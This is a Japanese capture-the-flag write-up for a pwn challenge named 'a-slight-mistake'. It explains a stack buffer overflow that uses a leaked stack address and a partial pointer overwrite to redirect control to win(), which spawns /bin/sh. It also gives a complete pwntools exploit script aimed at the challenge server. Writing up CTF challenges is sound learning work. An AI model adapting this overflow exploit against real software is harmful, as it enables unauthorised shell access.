# [a-slight-mistake] Writeup  
日付: 2026-07-11  
カテゴリ: pwn

---

##  問題概要

サーバに接続すると、起動時に以下のような出力が得られる：
[leaked] address of alpaca: 0x7fff0a9f2c20
your name>

名前を入力すると：
Hello, <name>! Nice to meet you!

と表示されて終了する。

バイナリを解析すると `win()` 関数が存在し、  
その中身は `/bin/sh` を起動する `execve("/bin/sh", 0, 0)` である。

つまり **win() に飛べばシェルが取れる**。

---

##  脆弱性の正体

`greet()` のスタックフレーム：
Stack[-0x48]: local_48   ← name バッファ


つまり **0x48 バイトのバッファオーバーフロー**が可能。

しかしこの問題は **RIP を直接上書きする ret2win ではない**。

理由：

- バイナリは **No PIE** → win のアドレスは固定  
- しかし **RIP はこのバッファの直後に存在しない**  
- スタック上に **関数ポインタ**があり、  
- その **下位 2 バイトだけ**を書き換えると win に飛ぶ

つまり **partial overwrite（ret2stack）**型の問題。

---

##  今回やったこと・悩んだこと

### 1. 最初は「普通の ret2win」だと思っていた

```python
payload = b"A"*0x48 + b"B"*8 + p64(0x4011b6)
```
- オーバーフローは成功
- しかし /bin/sh は起動せずクラッシュ
- RIP が見つからず混乱した

### 2. greet() のスタックを見ても RIP が見つからず混乱
ghidra で見ても：
Stack[-0x48]: local_48
しかなく、RIP がこの直後にあるようには見えなかった。

### 3. writeup（答え）を見て partial overwrite と判明

```
payload = b'A'*8
payload += p64(win_addr)
payload += b'A'*0x30
payload += p64(name_addr)[:2]
```
- 関数ポインタの下位2バイトだけ書き換える
- これで win() に飛べる構造だった

### 4. alpaca のリークの意味が分からず悩んだ
ローカルで調べると
alpaca: 0x7fffffffdd00
name:   0x7fffffffdcb0

offset = name - alpaca
リモートの alpaca に offset を足して
リモートの name のアドレスを復元する必要があった。

##完成コード
```python
from pwn import *

elf = ELF('./chall')
win_addr = elf.symbols['win']

p = remote('34.170.146.252', 43249)#毎回変わる

p.recvuntil(b'[leaked] address of `alpaca`:')
alpaca_addr = int(p.recvline().strip(), 16)

offset = 0x7fffffffdcb0 - 0x7fffffffdd00
name_addr = alpaca_addr + offset

payload  = b'A'*8
payload += p64(win_addr)
payload += b'A'*0x30
payload += p64(name_addr)[:2]

p.recvuntil(b'your name>')
p.send(payload)

p.interactive()
```
